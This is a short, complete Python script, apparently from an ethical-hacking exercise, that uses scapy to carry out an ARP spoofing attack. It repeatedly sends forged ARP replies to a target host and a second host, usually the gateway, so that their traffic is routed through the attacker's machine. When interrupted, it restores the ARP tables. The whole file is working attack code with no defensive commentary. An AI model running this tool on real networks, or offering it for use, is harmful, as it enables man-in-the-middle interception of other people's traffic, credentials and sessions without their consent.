#!usr/bin/env python
import time
import scapy.all as scapy
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target_ip", dest="target_ip", help="Enter target IP.")
    parser.add_argument("-s", "--spoof_ip", dest="spoof_ip", help="Enter spoof IP.")
    arguments = parser.parse_args()
    return arguments

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,  pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

sent_packets_count = 0
arguments = get_arguments()
try:
    while True:
        spoof(arguments.target_ip, arguments.spoof_ip)
        spoof(arguments.spoof_ip, arguments.target_ip)
        sent_packets_count += 2
        print("\r[+] Sent " + str(sent_packets_count) + " packets.", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] CTRL + C was detected... Resetting ARP tables...")
    restore(arguments.target_ip, arguments.spoof_ip)
    restore(arguments.spoof_ip, arguments.target_ip)